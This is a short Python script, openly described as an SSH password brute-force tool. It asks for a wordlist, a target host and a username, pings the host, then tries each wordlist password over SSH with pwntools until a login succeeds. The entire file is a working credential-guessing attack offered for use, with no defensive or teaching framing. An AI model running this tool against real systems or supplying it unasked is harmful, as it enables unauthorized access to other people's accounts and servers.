# [!] This tool created to make a ssh brute force password
# [!] Requirement: pwnlib
# [*] To install pwnlib: $pip install pwntools

from pwn import *
import subprocess
import paramiko
import platform


def check_host(host):
    option = ''
    host = host.rstrip('\n').rstrip('\r')
    platform_name = platform.system().lower()
    if 'windows' == platform_name:
        option = '-n'
    elif 'linux' == platform_name:
        option = '-c'
    else:
        exit(f'[-] Other platform: {platform_name}')
    try:
        subprocess.check_output(['ping', option, '1', host])
    except subprocess.SubprocessError:
        exit('[-] Host not found!')


def get_message(message: str):
    user_input = input(message).rstrip('\r').rstrip('\n')
    return user_input


if __name__ == '__main__':
    try:
        file_name = get_message('[*] Enter wordlist directory: ')
        if not os.path.isfile(file_name):
            exit(f'[-] Wordlist not found!')
        host_name = get_message('[*] Enter host name: ')
        check_host(host_name)
        user_name = get_message('[*] Enter username: ')
        print(f'\n[*] Trying connect to: {user_name}@{host_name}\n\n')
        list_password = open(file_name, 'r', encoding='UTF-8').readlines()
        for password in list_password:
            index = list_password.index(password)
            password = password.rstrip('\n')
            try:
                print(f'[{index}] Trying with password: "{password}"')
                respond = ssh(host=host_name, user=user_name, password=password)
                if respond.connected():
                    print('   > End process!')
                    respond.close()
                    break
                respond.close()
            except paramiko.ssh_exception.AuthenticationException:
                print()
                pass
    except KeyboardInterrupt:
        exit(0)
